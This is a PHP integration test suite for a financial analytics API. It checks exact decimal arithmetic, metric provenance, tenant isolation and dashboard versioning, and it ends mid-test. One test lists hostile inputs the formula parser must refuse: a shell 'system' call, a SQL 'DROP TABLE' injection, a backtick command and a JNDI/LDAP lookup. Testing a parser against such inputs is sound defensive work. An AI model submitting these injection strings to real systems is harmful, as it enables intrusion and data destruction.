<?php

declare(strict_types=1);

/**
 * Integration tests for Insights.
 *
 * They run against a REAL PostgreSQL database and a stub that answers the
 * ACTUAL shapes Books, Inventory and Manage return — so what is under test is
 * the real SQL, the real HTTP client, the real permission checks and the real
 * decimal arithmetic, not mocks of them.
 *
 * Tests go through the CONTROLLERS wherever a controller exists, because the
 * permission and tenant checks live there. A test that called the service
 * directly would pass while the endpoint was wide open.
 *
 *   php server-php/tests/integration.php
 */

namespace Aicountly\Api;

require __DIR__ . '/../src/Env.php';
require __DIR__ . '/../src/Autoload.php';

Env::load(__DIR__ . '/../.env');

use Aicountly\Api\Ai\Copilot;
use Aicountly\Api\Analytics\AnomalyService;
use Aicountly\Api\Analytics\ForecastService;
use Aicountly\Api\Analytics\OverviewService;
use Aicountly\Api\Controllers\AiController;
use Aicountly\Api\Controllers\DashboardsController;
use Aicountly\Api\Controllers\MetricsController;
use Aicountly\Api\Controllers\QueryController;
use Aicountly\Api\Controllers\ReportsController;
use Aicountly\Api\Controllers\SourcesController;
use Aicountly\Api\Dashboards\DashboardService;
use Aicountly\Api\Dashboards\TemplateCatalog;
use Aicountly\Api\Dashboards\WidgetSchema;
use Aicountly\Api\Dashboards\WidgetSchemaError;
use Aicountly\Api\Metrics\CustomMetrics;
use Aicountly\Api\Metrics\Expression;
use Aicountly\Api\Metrics\ExpressionError;
use Aicountly\Api\Metrics\MetricCatalog;
use Aicountly\Api\Metrics\MetricResult;
use Aicountly\Api\Metrics\QueryService;
use Aicountly\Api\Reports\ReportService;
use Aicountly\Api\Reports\XlsxWriter;
use Aicountly\Api\Support\Decimal;
use Aicountly\Api\Support\Format;
use Aicountly\Api\Support\Period;

// ---------------------------------------------------------------------------
// Harness
// ---------------------------------------------------------------------------

$passed = 0;
$failed = 0;
$section = '';

function section(string $name): void
{
    global $section;
    $section = $name;
    echo "\n" . $name . "\n";
}

function check(string $name, callable $fn): void
{
    global $passed, $failed;
    try {
        $fn();
        echo "  ok    {$name}\n";
        $passed++;
    } catch (\Throwable $e) {
        echo "  FAIL  {$name}\n        {$e->getMessage()}\n";
        if (getenv('VERBOSE')) {
            echo '        ' . $e->getFile() . ':' . $e->getLine() . "\n";
        }
        $failed++;
    }
}

function assertSame(mixed $expected, mixed $actual, string $what): void
{
    if ($expected !== $actual) {
        throw new \RuntimeException(sprintf('%s: expected %s, got %s', $what, var_export($expected, true), var_export($actual, true)));
    }
}

function assertTrue(bool $condition, string $what): void
{
    if (!$condition) {
        throw new \RuntimeException($what);
    }
}

function assertContains(string $needle, string $haystack, string $what): void
{
    if (!str_contains($haystack, $needle)) {
        throw new \RuntimeException($what . ' — expected to find "' . $needle . '" in: ' . mb_substr($haystack, 0, 400));
    }
}

/**
 * Call a controller and capture the response it produced.
 *
 * @param array<string, mixed> $get
 * @param array<string, mixed>|null $body
 */
function call(callable $endpoint, array $get = [], ?array $body = null, array $args = []): ResponseSent
{
    $_GET = $get;
    $_SERVER['REQUEST_METHOD'] = $body === null ? 'GET' : 'POST';
    Http::setBodyForTesting($body);

    try {
        $endpoint(...$args);
    } catch (ResponseSent $sent) {
        Http::setBodyForTesting(null);

        return $sent;
    }

    Http::setBodyForTesting(null);
    throw new \RuntimeException('The endpoint returned without sending a response.');
}

// ---------------------------------------------------------------------------
// Fixtures
// ---------------------------------------------------------------------------

$pdo = Db::connect();
foreach ([
    'insights_anomaly_notes', 'insights_anomaly_reviews', 'insights_ai_proposals',
    'insights_ai_usage', 'insights_audit_events', 'insights_dashboard_favourites',
    'insights_dashboard_shares', 'insights_dashboard_versions', 'insights_dashboard_widgets',
    'insights_dashboards', 'insights_metric_definitions', 'insights_report_definitions',
    'insights_permission_assignments', 'insights_permission_profiles',
    'insights_user_preferences', 'insights_company_settings',
] as $table) {
    $pdo->exec('TRUNCATE ' . $table . ' RESTART IDENTITY CASCADE');
}

const OWNER = 'uuid-owner-1';
const COLLEAGUE = 'uuid-colleague-2';
const RESTRICTED = 'uuid-restricted-3';

/** An authenticated caller, with their company access already established. */
function actor(string $uuid, int $cmpId = 1, ?int $accessType = 1): array
{
    $auth = Auth::forTesting($uuid, 'ses-' . $uuid);
    Auth::adopt($auth);
    $ctx = Context::of($cmpId, 1, 0);
    Context::seedVerifiedForTesting($cmpId, $auth, $accessType);
    Permissions::forget();

    return [$auth, $ctx];
}

function scope(int $cmpId = 1): array
{
    return ['cmp_id' => $cmpId, 'fy_id' => 1, 'bo_id' => 0, 'preset' => 'custom', 'from' => '2026-01-01', 'to' => '2026-01-31'];
}

/**
 * Run a closure with Books pointed at a base the stub refuses, then restore.
 *
 * The restore is in a finally because an assertion inside the closure throws,
 * and a leaked environment makes every later test fail for the wrong reason.
 */
function withBooksDown(callable $fn): void
{
    Env::load(__DIR__ . '/../.env.books-down');
    try {
        $fn();
    } finally {
        Env::load(__DIR__ . '/../.env');
    }
}

/**
 * Give somebody an Insights permission profile, as Settings would.
 *
 * Used where a test needs a permission the read-only baseline does not carry —
 * exporting, asking the model, sharing. Granting it through the real tables is
 * what makes the test prove the permission is enforced rather than absent.
 *
 * @param list<string> $permissions
 */
function grant(string $uuid, array $permissions, int $cmpId = 1): void
{
    $profileId = (int) Db::insert('insights_permission_profiles', [
        'cmp_id'       => $cmpId,
        'profile_name' => 'test-' . substr(md5($uuid . implode(',', $permissions)), 0, 8),
        'permissions'  => Db::json($permissions),
        'created_by'   => 'test',
    ], 'profile_id');

    Db::run(
        'INSERT INTO insights_permission_assignments (cmp_id, user_uuid, profile_id, assigned_by)
         VALUES (:cmp, :uuid, :profile, :by) ON CONFLICT DO NOTHING',
        ['cmp' => $cmpId, 'uuid' => $uuid, 'profile' => $profileId, 'by' => 'test'],
    );

    Permissions::forget();
}

// ===========================================================================

section('Runtime — what this server can and cannot do');

check('a fit server reports no problems', function (): void {
    // This container runs a supported PHP with every extension loaded, so the
    // check must be silent here. A check that fires on a healthy server is one
    // people learn to ignore.
    assertSame([], \Aicountly\Api\Runtime::unmet(), 'nothing unmet on a fit server');

    $report = \Aicountly\Api\Runtime::report();
    assertTrue($report['ok'], 'the health block agrees');
    assertSame(PHP_VERSION, $report['php'], 'and names the version it actually found');
});

check('the minimum PHP version matches what the code really needs', function (): void {
    // Auth and Http use readonly promotion and `never`, both 8.1. If either
    // stops being true the constant is wrong, and the gate would let an
    // unsupported server through to a ParseError and a blank 500 — which is the
    // failure this whole file exists to prevent.
    $needsEightOne = 0;
    foreach (['src/Auth.php', 'src/Http.php'] as $file) {
        $source = (string) file_get_contents(__DIR__ . '/../' . $file);
        if (preg_match('/(public|private|protected)\s+readonly|\)\s*:\s*never/', $source) === 1) {
            $needsEightOne++;
        }
    }

    assertTrue($needsEightOne > 0, 'the routed path still uses PHP 8.1 syntax');
    assertSame('8.1.0', \Aicountly\Api\Runtime::MINIMUM_PHP, 'and the constant says so');
});

check('no curl constant is named that an older libcurl would not define', function (): void {
    // THIS TEST EXISTS BECAUSE THE CONTAINER LIED. CURLOPT_PROTOCOLS_STR needs
    // libcurl 7.85, and PHP does not define it when linked against anything
    // older. Here libcurl is new enough that the constant exists, every test
    // passed, and production — same PHP, older libcurl — answered 500 to every
    // cross-service call while /api/health stayed green, because health makes
    // none. An undefined constant is a fatal Error in PHP 8.
    //
    // So the rule is checked by reading the source rather than by running it:
    // anything outside the floor below has to be guarded with defined().
    $availableEverywhere = [
        'CURLOPT_RETURNTRANSFER', 'CURLOPT_CUSTOMREQUEST', 'CURLOPT_HTTPHEADER',
        'CURLOPT_CONNECTTIMEOUT', 'CURLOPT_TIMEOUT', 'CURLOPT_HEADER',
        'CURLOPT_POST', 'CURLOPT_POSTFIELDS', 'CURLOPT_FOLLOWLOCATION', 'CURLOPT_WRITEFUNCTION',
        'CURLOPT_URL', 'CURLOPT_NOBODY', 'CURLOPT_SSL_VERIFYPEER', 'CURLOPT_SSL_VERIFYHOST',
        'CURLINFO_RESPONSE_CODE', 'CURLINFO_CONTENT_TYPE', 'CURLINFO_HEADER_SIZE',
        'CURLM_OK', 'CURLM_CALL_MULTI_PERFORM', 'CURLMSG_DONE',
        'CURLPROTO_HTTP', 'CURLPROTO_HTTPS', 'CURLOPT_PROTOCOLS',
    ];

    $unguarded = [];
    foreach (new \RecursiveIteratorIterator(new \RecursiveDirectoryIterator(__DIR__ . '/../src')) as $file) {
        if ($file->getExtension() !== 'php') {
            continue;
        }
        $source = (string) file_get_contents($file->getPathname());

        // Every constant the file names, minus every one it checks first.
        preg_match_all('/\b(CURL[A-Z]*_[A-Z0-9_]+)\b/', $source, $named);
        preg_match_all("/defined\(\s*'(CURL[A-Z]*_[A-Z0-9_]+)'\s*\)/", $source, $guarded);

        foreach (array_unique($named[1]) as $constant) {
            if (in_array($constant, $availableEverywhere, true)) {
                continue;
            }
            if (in_array($constant, $guarded[1], true)) {
                continue;
            }
            $unguarded[] = basename($file->getPathname()) . ': ' . $constant;
        }
    }

    assertSame(
        [],
        $unguarded,
        'every curl constant outside the floor is guarded with defined() — otherwise: ' . implode(', ', $unguarded),
    );
});

check('the protocol restriction still applies, whichever constant exists', function (): void {
    // Guarding it must not have quietly dropped it: this is what stops a
    // redirect or a malformed base making the client speak file://.
    $source = (string) file_get_contents(__DIR__ . '/../src/Clients/ApiClient.php');

    assertContains("CURLOPT_PROTOCOLS_STR] = 'http,https'", $source, 'the modern form is set when available');
    assertContains('CURLPROTO_HTTP | CURLPROTO_HTTPS', $source, 'and the older form when it is not');
    assertTrue(
        preg_match('/CURLOPT_FOLLOWLOCATION\s*=>\s*false/', $source) === 1,
        'redirects stay off regardless',
    );
});

check('Runtime itself parses on an interpreter too old to run the product', function (): void {
    // Its whole job is to report on such a server, so it cannot use anything
    // newer than the oldest PHP that might be asked to load it.
    $source = (string) file_get_contents(__DIR__ . '/../src/Runtime.php');

    foreach ([
        '/(public|private|protected)\s+readonly/' => 'readonly promotion (8.1)',
        '/\)\s*:\s*never/'                        => 'never return type (8.1)',
        '/^\s*enum\s+/m'                          => 'enum (8.1)',
        '/\bmatch\s*\(/'                          => 'match (8.0)',
        '/\?\?=/'                                  => 'null coalescing assignment (7.4)',
        '/\bfn\s*\(/'                             => 'arrow function (7.4)',
        '/declare\s*\(\s*strict_types/'           => 'strict_types, which would fail the call it is trying to report',
    ] as $pattern => $what) {
        assertTrue(preg_match($pattern, $source) !== 1, 'Runtime.php avoids ' . $what);
    }
});

// ===========================================================================

section('Decimal arithmetic — the financial correctness floor');

check('0.1 + 0.2 is exactly 0.3', function (): void {
    assertSame('0.3', Decimal::add('0.1', '0.2'), 'exact addition');
});

check('a zero denominator is not applicable, not zero', function (): void {
    assertSame(null, Decimal::div('1000', '0'), 'division by zero');
    assertSame(null, Decimal::percentOf('500', '0'), 'percentage of zero');
    assertSame(null, Decimal::percentChange('0', '500'), 'change from zero');
});

check('a percentage change and a percentage-point change are different', function (): void {
    $margin = MetricCatalog::require('finance.gross_margin');
    $revenue = MetricCatalog::require('finance.net_revenue');
    assertSame('percentage_points', $margin->comparisonKind(), 'a percentage metric changes in points');
    assertSame('percent', $revenue->comparisonKind(), 'a currency metric changes in percent');
});

check('large money totals keep their paise', function (): void {
    assertSame('999999.99', Decimal::sub('1000000.05', '0.06'), 'no float drift');
    assertSame('1,23,45,678.92', trim(Format::money('12345678.916'), "\u{20B9}"), 'Indian grouping, rounded half-up');
});

// ===========================================================================

section('Metric catalogue — every metric declares where it comes from');

check('every metric has a definition, a binding and an owner', function (): void {
    foreach (MetricCatalog::all() as $id => $definition) {
        assertTrue($definition->definition !== '', $id . ' has no definition sentence');
        assertTrue($definition->binding !== '', $id . ' has no binding');
        assertTrue($definition->owningProduct !== '', $id . ' has no owning product');
        assertTrue(in_array($definition->unit, \Aicountly\Api\Metrics\MetricDefinition::UNITS, true), $id . ' has an unknown unit');
    }
});

check('only Books and Inventory own accounting metrics', function (): void {
    foreach (MetricCatalog::all() as $id => $definition) {
        if (!in_array($definition->accountingBasis, ['accrual', 'cash', 'balance'], true)) {
            continue;
        }
        assertTrue(
            in_array($definition->owningProduct, ['books', 'inventory'], true),
            $id . ' claims an accounting basis but is owned by ' . $definition->owningProduct
                . '. Only Books and Inventory may own one — otherwise the same sale is counted twice.',
        );
    }
});

check('an accrual figure is not compatible with an operational one', function (): void {
    $revenue = MetricCatalog::require('finance.net_revenue');
    $balance = MetricCatalog::require('finance.receivables');
    assertTrue($revenue->isCompatibleWith($balance), 'two accounting figures share a family');
    $fake = new \Aicountly\Api\Metrics\MetricDefinition(
        'ops.orders', 'Orders', 'x', 'sales', 'x', 'x', 'sum', 'currency', 2, [], ['month'], 'operational', [],
    );
    assertTrue(!$revenue->isCompatibleWith($fake), 'an accrual figure must not mix with an operational one');
});

// ===========================================================================

section('Custom KPI expressions — validated, never executed');

check('a valid formula compiles, checks and evaluates exactly', function (): void {
    $expression = Expression::compile('finance.net_revenue - finance.expense');
    $shape = $expression->check(static fn (string $id) => MetricCatalog::get($id));
    assertSame('currency', $shape['unit'], 'unit of a difference of two money figures');
    $result = $expression->evaluate(['finance.net_revenue' => '1250000.55', 'finance.expense' => '940000.25']);
    assertSame('310000.3', $result['value'], 'exact subtraction');
});

check('a missing input makes the KPI unavailable, never zero', function (): void {
    $expression = Expression::compile('finance.net_revenue - finance.cogs');
    $result = $expression->evaluate(['finance.net_revenue' => '1250000.55', 'finance.cogs' => null]);
    assertSame(MetricResult::UNAVAILABLE, $result['status'], 'a missing input is unavailable');
    assertSame(null, $result['value'], 'and has no value');
    assertContains('not zero', (string) $result['reason'], 'and says so');
});

check('a zero denominator is not applicable', function (): void {
    $expression = Expression::compile('percent_of(finance.collections, finance.net_revenue)');
    $result = $expression->evaluate(['finance.collections' => '50000', 'finance.net_revenue' => '0']);
    assertSame(MetricResult::NOT_APPLICABLE, $result['status'], 'zero base');
});

check('code, SQL and shell cannot get through the parser', function (): void {
    foreach ([
        'system("ls")',
        'finance.net_revenue; DROP TABLE insights_dashboards',
        '`id`',
        'eval(finance.net_revenue)',
        '${jndi:ldap://x}',
        'finance.net_revenue -- comment',
    ] as $attempt) {
        try {
            Expression::compile($attempt)->check(static fn (string $id) => MetricCatalog::get($id));
            throw new \RuntimeException('"' . $attempt . '" was accepted and must not be');
        } catch (ExpressionError) {
            // Refused, which is the point.
        }
    }
});

check('incompatible units and bases are refused with a readable reason', function (): void {
    $cases = [
        'finance.net_revenue + finance.gross_margin' => 'incompatible_units',
        'finance.net_revenue + finance.receivables'  => 'incompatible_basis',
        'finance.net_revenue * finance.expense'      => 'incompatible_units',
    ];
    foreach ($cases as $formula => $expectedCode) {
        try {
            Expression::compile($formula)->check(static fn (string $id) => MetricCatalog::get($id));
            throw new \RuntimeException($formula . ' was accepted');
        } catch (ExpressionError $e) {
            assertSame($expectedCode, $e->errorCode, $formula . ' rejected for the wrong reason');
        }
    }
});

check('a custom KPI round-trips through the database and evaluates', function (): void {
    [$auth, $ctx] = actor(OWNER);
    CustomMetrics::forgetAll();

    $response = call([MetricsController::class, 'saveCustom'], scope(), [
        'label'      => 'Cash conversion',
        'definition' => 'Collections as a share of sales.',
        'formula'    => 'percent_of(finance.collections, finance.net_revenue)',
    ] + scope());

    assertSame(201, $response->status, 'a KPI is created');
    $saved = $response->data();
    assertSame('custom.cash_conversion', $saved['id'], 'the id is derived from the label');
    assertSame('percent', $saved['unit'], 'the unit comes from the formula, not the dropdown');

    CustomMetrics::forgetAll();
    $definition = CustomMetrics::definition($ctx, 'custom.cash_conversion');
    assertTrue($definition !== null, 'the KPI is readable back');
    assertSame(['finance.collections', 'finance.net_revenue'], $definition->dependsOn, 'its dependencies are recorded');
});

check('a self-referential KPI is refused', function (): void {
    actor(OWNER);
    $response = call([MetricsController::class, 'saveCustom'], scope(), [
        'label'   => 'Cash conversion',
        'formula' => 'custom.cash_conversion + 1',
    ] + scope());
    assertSame(422, $response->status, 'a cycle is refused');
});

// ===========================================================================

section('Live reads — provenance, coverage and "unavailable is not zero"');

check('a metric comes back with its value, provenance and scope', function (): void {
    [$auth, $ctx] = actor(OWNER);

    $response = call([QueryController::class, 'metrics'], scope() + ['metrics' => 'finance.net_revenue,finance.collections']);
    assertSame(200, $response->status, 'the query answers');

    $metrics = $response->data()['metrics'];
    $revenue = $metrics['finance.net_revenue'];

    assertSame('available', $revenue['status'], 'net sales is available');
    assertSame('1250000.55', $revenue['value'], 'the exact figure from Books');
    assertSame(1, $revenue['scope']['company_id'], 'the scope is on the result');
    assertSame('books', $revenue['provenance'][0]['product'], 'provenance names Books');
    assertContains('dashboard/sales', $revenue['provenance'][0]['endpoint'], 'provenance names the endpoint');
    assertTrue($revenue['fetched_at'] !== null, 'the fetch time is recorded');
});

check('collections and cash received are different figures, and say so', function (): void {
    actor(OWNER);

    $response = call([QueryController::class, 'metrics'], scope() + [
        'metrics' => 'finance.collections,finance.cash_received',
    ]);

    $metrics = $response->data()['metrics'];
    $collections = $metrics['finance.collections'];
    $cash = $metrics['finance.cash_received'];

    // A receipt that settles 10,000 with 500 discount allowed moves the customer
    // balance by 10,000 and the bank by 9,500. Calling either one "money
    // received" overstates or understates by every rupee of discount and TDS in
    // the period, so Books reports both and the catalogue keeps them apart.
    assertSame('available', $collections['status'], 'collections is available');
    assertSame('available', $cash['status'], 'cash received is available');
    assertTrue(
        $collections['value'] !== $cash['value'],
        'the two are not the same number',
    );
    assertTrue(
        (float) $collections['value'] > (float) $cash['value'],
        'and the balance moved further than the money did',
    );

    assertContains('balances fell', $collections['definition']['text'], 'collections says what it measures');
    assertContains('actually arrived', $cash['definition']['text'], 'cash received says what it measures');
    assertContains('kpis.cash_received', $cash['provenance'][0]['contract'], 'and names the field it read');
});

check('a comparison is a second read, not a guess', function (): void {
    actor(OWNER);

    $response = call([QueryController::class, 'metrics'], scope() + [
        'metrics' => 'finance.net_revenue',
        'compare' => 'previous_period',
    ]);

    $comparison = $response->data()['metrics']['finance.net_revenue']['comparison'];
    assertTrue($comparison !== null, 'a comparison is attached');
    assertSame('1000000.44', $comparison['value'], 'the comparison window was actually fetched');
    assertSame('percent', $comparison['change_kind'], 'a money metric changes in percent');
    assertSame('up', $comparison['direction'], 'sales rose');
});

check('an unreachable source is unavailable, never zero', function (): void {
    actor(OWNER);

    // .env.books-down points BOOKS_API_BASE at a path the stub answers 503 on.
    // Restored in a finally: an assertion that threw halfway would otherwise
    // leave every later test running against a Books that is down, and the
    // failures would look like bugs in the code under test.
    withBooksDown(static function (): void {
        $response = call([QueryController::class, 'metrics'], scope() + ['metrics' => 'finance.net_revenue']);
        $metric = $response->data()['metrics']['finance.net_revenue'];

        assertSame('unavailable', $metric['status'], 'an unreachable Books is unavailable');
        assertSame(null, $metric['value'], 'and has NO value');
        assertSame('Unavailable', $metric['formatted'], 'and does not render as a number');
        assertContains('rather than zero', (string) $metric['message'], 'and says so in the message');
    });
});

check('a forbidden source is denied, which is different from unavailable', function (): void {
    // Company 77: Manage says member (not owner) and Books answers 403.
    actor(COLLEAGUE, 77, 0);

    $response = call([QueryController::class, 'metrics'], scope(77) + ['metrics' => 'finance.net_revenue']);
    $metric = $response->data()['metrics']['finance.net_revenue'];

    assertSame('denied', $metric['status'], 'a 403 from Books is denied');
    assertSame('Not permitted', $metric['formatted'], 'and renders as not permitted');
    assertContains('dashboard.read', (string) $metric['message'], 'and names the permission needed over there');
});

check('a derived metric with a missing input is unavailable, not zero', function (): void {
    actor(OWNER);

    $response = call([QueryController::class, 'metrics'], scope() + ['metrics' => 'finance.gross_margin']);
    $metric = $response->data()['metrics']['finance.gross_margin'];

    assertSame('unavailable', $metric['status'], 'gross margin needs COGS, which nothing exposes');
    assertSame(null, $metric['value'], 'and is not zero');
    assertContains('Cost of goods sold', (string) $metric['message'], 'and names what is missing');
});

check('a derived metric computes exactly when its inputs are present', function (): void {
    actor(OWNER);

    $response = call([QueryController::class, 'metrics'], scope() + ['metrics' => 'finance.overdue_share,finance.working_capital_tied']);
    $metrics = $response->data()['metrics'];

    // 312400.10 / 845000.25 * 100, to one place.
    assertSame('available', $metrics['finance.overdue_share']['status'], 'overdue share computes');
    assertSame('37', $metrics['finance.overdue_share']['value'], 'the exact percentage');
    assertSame('37.0%', $metrics['finance.overdue_share']['formatted'], 'and it displays to one place');

    // 1880000.50 + 845000.25 — two balances at the same date.
    assertSame('2725000.75', $metrics['finance.working_capital_tied']['value'], 'two balances add exactly');
});

check('a ranking is reported as partial, not as the whole population', function (): void {
    actor(OWNER);

    $response = call([QueryController::class, 'breakdown'], scope() + [
        'metric' => 'finance.net_revenue', 'dimension' => 'customer',
    ]);
    $metric = $response->data()['metric'];

    assertSame('partial', $metric['status'], 'a top-N is partial');
    assertSame('partial', $metric['coverage'], 'and its coverage says so');
    assertTrue($metric['warnings'] !== [], 'and it carries a warning explaining why');
});

check('an ageing breakdown does not double count the total bucket', function (): void {
    actor(OWNER);

    $response = call([QueryController::class, 'breakdown'], scope() + [
        'metric' => 'finance.receivables', 'dimension' => 'ageing_bucket',
    ]);
    $metric = $response->data()['metric'];

    $keys = array_column($metric['breakdown'], 'key');
    assertTrue(!in_array('total', $keys, true), 'the source\'s own "total" bucket must not be charted beside the parts');

    // The parts sum to the source's total, which is what proves nothing was
    // dropped OR counted twice.
    assertSame('845000.25', $metric['value'], 'the buckets sum to the receivable exactly');
});

check('Inventory is read from the summary, and a truncated list says so', function (): void {
    actor(OWNER);

    $response = call([QueryController::class, 'metrics'], scope() + ['metrics' => 'inventory.stock_value,inventory.item_count']);
    $metrics = $response->data()['metrics'];

    assertSame('1880000.5', $metrics['inventory.stock_value']['value'], 'the company total, not a page of rows');
    assertContains('18,80,000.50', $metrics['inventory.stock_value']['formatted'], 'and it displays with its paise');
    assertSame('3', $metrics['inventory.item_count']['value'], 'the item count from the same summary');
    assertTrue($metrics['inventory.stock_value']['source_as_of'] !== null, 'and the source states how fresh it is');
});

// ===========================================================================

section('Tenant isolation');

check('a company Manage refuses is a 403, not an empty result', function (): void {
    $auth = Auth::forTesting(OWNER, 'ses-' . OWNER);
    Auth::adopt($auth);
    Context::forgetVerified();

    $response = call([QueryController::class, 'metrics'], scope(99) + ['metrics' => 'finance.net_revenue']);

    assertSame(403, $response->status, 'company 99 is refused');
    assertSame('forbidden', $response->errorCode(), 'and it is a permission answer, not an empty page');
});

check('a dashboard in another company is invisible, and reads as not found', function (): void {
    [$auth, $ctx] = actor(OWNER, 1);
    $created = (new DashboardService($ctx, $auth))->create(['title' => 'Company one board']);

    // The same person, a different company. Their own dashboard must not
    // appear, and must not be distinguishable from one that does not exist.
    actor(OWNER, 2);
    $response = call([DashboardsController::class, 'show'], scope(2), null, [$created['id']]);

    assertSame(404, $response->status, 'a cross-company dashboard is not found');
});

check('the library lists in every scope, for an owner and for a member', function (): void {
    // REGRESSION. The visibility predicate collapses to TRUE for someone who
    // owns the company, which removed the only mention of :uuid from the count
    // query — and PDO refuses a bound parameter the statement does not use. It
    // surfaced as a 503 "database unreachable" on the Dashboards page, for the
    // one kind of user most likely to be looking at it.
    [$auth, $ctx] = actor(OWNER, 1, 1);
    $service = new DashboardService($ctx, $auth);
    $service->create(['title' => 'Trading board']);
    $service->create(['title' => 'Cash board', 'visibility' => 'organisation']);

    foreach (['all', 'mine', 'shared', 'team'] as $scope) {
        $response = call([DashboardsController::class, 'index'], scope() + ['scope' => $scope]);
        assertSame(200, $response->status, $scope . ' lists for a company owner');
    }

    // And with a search term, which adds a bind the count query does use.
    $response = call([DashboardsController::class, 'index'], scope() + ['scope' => 'all', 'q' => 'trading']);
    assertSame(200, $response->status, 'a search lists for a company owner');
    assertSame(1, count($response->payload['data'] ?? []), 'and it filters');

    // A member, whose predicate keeps :uuid, must still work.
    actor(COLLEAGUE, 1, 0);
    foreach (['all', 'mine', 'shared', 'team'] as $scope) {
        $response = call([DashboardsController::class, 'index'], scope() + ['scope' => $scope]);
        assertSame(200, $response->status, $scope . ' lists for a member');
    }

    // The member sees the organisation-wide board and not the owner's private one.
    $response = call([DashboardsController::class, 'index'], scope() + ['scope' => 'all']);
    $titles = array_map(static fn (array $row): string => (string) $row['title'], $response->payload['data'] ?? []);
    assertTrue(in_array('Cash board', $titles, true), 'the organisation board is visible to a colleague');
    assertTrue(!in_array('Trading board', $titles, true), "and the owner's private board is not");
});

// ===========================================================================

section('Dashboards — build, save, version, share');

check('create, add widgets, reorder, save and reload preserves everything', function (): void {
    [$auth, $ctx] = actor(OWNER);
    $service = new DashboardService($ctx, $auth);

    $created = $service->create([
        'title'    => 'Owner board',
        'settings' => ['preset' => 'this_month', 'grain' => 'month'],
        'widgets'  => [
            ['widget_type' => 'kpi', 'title' => 'Net sales', 'config' => ['metric_id' => 'finance.net_revenue'], 'layout' => ['desktop' => ['x' => 0, 'y' => 0, 'w' => 3, 'h' => 2]]],
            ['widget_type' => 'kpi', 'title' => 'Collections', 'config' => ['metric_id' => 'finance.collections'], 'layout' => ['desktop' => ['x' => 3, 'y' => 0, 'w' => 3, 'h' => 2]]],
        ],
    ]);

    assertSame(2, count($created['widgets']), 'both widgets saved');
    assertSame(1, $created['revision'], 'it starts at revision 1');

    // Reorder and resize, exactly as the builder would send it.
    $widgets = array_reverse($created['widgets']);
    $widgets[0]['layout']['desktop'] = ['x' => 0, 'y' => 0, 'w' => 6, 'h' => 3];
    $widgets[1]['layout']['desktop'] = ['x' => 6, 'y' => 0, 'w' => 6, 'h' => 3];

    $saved = $service->save($created['id'], ['revision' => 1, 'widgets' => $widgets]);
    assertSame(2, $saved['revision'], 'saving moves the revision');

    $reloaded = $service->find($created['id']);
    assertSame('Collections', $reloaded['widgets'][0]['title'], 'the new order survived the round trip');
    assertSame(6, $reloaded['widgets'][0]['layout']['desktop']['w'], 'the new width survived');
    assertTrue(isset($reloaded['widgets'][0]['layout']['tablet'], $reloaded['widgets'][0]['layout']['mobile']), 'all three breakpoints are stored');
});

check('a widget wider than the grid is pulled back inside it', function (): void {
    actor(OWNER);
    $ctx = Context::of(1, 1, 0);

    $widget = WidgetSchema::widget([
        'widget_type' => 'kpi',
        'title'       => 'Wide',
        'config'      => ['metric_id' => 'finance.net_revenue'],
        'layout'      => ['desktop' => ['x' => 10, 'y' => 0, 'w' => 8, 'h' => 2]],
    ], $ctx);

    $desktop = $widget['layout']['desktop'];
    assertTrue($desktop['x'] + $desktop['w'] <= 12, 'the widget fits the 12-column grid');
});

check('a stale save is a conflict naming who changed it', function (): void {
    [$auth, $ctx] = actor(OWNER);
    $service = new DashboardService($ctx, $auth);
    $created = $service->create(['title' => 'Contested board']);

    $service->save($created['id'], ['revision' => 1, 'title' => 'First writer wins']);

    $response = null;
    try {
        $service->save($created['id'], ['revision' => 1, 'title' => 'Second writer, stale']);
        throw new \RuntimeException('a stale save was accepted');
    } catch (ResponseSent $sent) {
        $response = $sent;
    }

    assertSame(409, $response->status, 'a stale save is a conflict');
    assertSame('conflict', $response->errorCode(), 'with a conflict code');
    assertSame(2, $response->payload['error']['details']['current_revision'], 'and it names the current revision');
});

check('restoring a revision restores the layout and NOT the audience', function (): void {
    [$auth, $ctx] = actor(OWNER);
    $service = new DashboardService($ctx, $auth);

    $created = $service->create([
        'title'   => 'History board',
        'widgets' => [['widget_type' => 'kpi', 'title' => 'Original', 'config' => ['metric_id' => 'finance.net_revenue']]],
    ]);

    // Share it, then change it, then restore the pre-share revision.
    $service->share($created['id'], ['subject_type' => 'user', 'subject_id' => COLLEAGUE, 'permission' => 'view']);
    $service->save($created['id'], [
        'revision' => 1,
        'widgets'  => [['widget_type' => 'kpi', 'title' => 'Changed', 'config' => ['metric_id' => 'finance.collections']]],
    ]);

    $restored = $service->restore($created['id'], 1);
    assertSame('Original', $restored['widgets'][0]['title'], 'the old layout came back');

    // The share made AFTER revision 1 must still be there: rolling back a
    // layout must not roll back who may see it.
    assertSame(1, count($restored['shares']), 'the share survived the restore');
    assertSame(COLLEAGUE, $restored['shares'][0]['subject_id'], 'and it is the same person');
});

check('a duplicate belongs to whoever copied it and starts private', function (): void {
    [$auth, $ctx] = actor(OWNER);
    $service = new DashboardService($ctx, $auth);
    $created = $service->create(['title' => 'Shared original', 'visibility' => 'organisation']);
    $service->share($created['id'], ['subject_type' => 'user', 'subject_id' => COLLEAGUE, 'permission' => 'view']);

    [$auth2, $ctx2] = actor(COLLEAGUE, 1, 0);
    $copy = (new DashboardService($ctx2, $auth2))->duplicate($created['id']);

    assertSame(COLLEAGUE, $copy['owner_uuid'], 'the copy belongs to the copier');
    assertSame('private', $copy['visibility'], 'and starts private');
    assertSame(0, count($copy['shares']), 'and inherits no audience');
});

check('publishing fixes what viewers see while the draft moves on', function (): void {
    [$auth, $ctx] = actor(OWNER);
    $service = new DashboardService($ctx, $auth);

    $created = $service->create([
        'title'   => 'Published board',
        'widgets' => [['widget_type' => 'kpi', 'title' => 'Published version', 'config' => ['metric_id' => 'finance.net_revenue']]],
    ]);
    $service->publish($created['id']);
    $service->save($created['id'], [
        'revision' => (int) $service->find($created['id'])['revision'],
        'widgets'  => [['widget_type' => 'kpi', 'title' => 'Unpublished draft', 'config' => ['metric_id' => 'finance.collections']]],
    ]);

    assertSame('Published version', $service->find($created['id'], true)['widgets'][0]['title'], 'viewers see the published one');
    assertSame('Unpublished draft', $service->find($created['id'], false)['widgets'][0]['title'], 'the editor sees the draft');
});

// ===========================================================================

section('Sharing grants configuration, not data');

check('a viewer with a share sees the layout and is refused the data they lack', function (): void {
    [$ownerAuth, $ownerCtx] = actor(OWNER, 1);
    $service = new DashboardService($ownerCtx, $ownerAuth);
    $created = $service->create([
        'title'   => 'Finance board',
        'widgets' => [['widget_type' => 'kpi', 'title' => 'Net sales', 'config' => ['metric_id' => 'finance.net_revenue']]],
    ]);
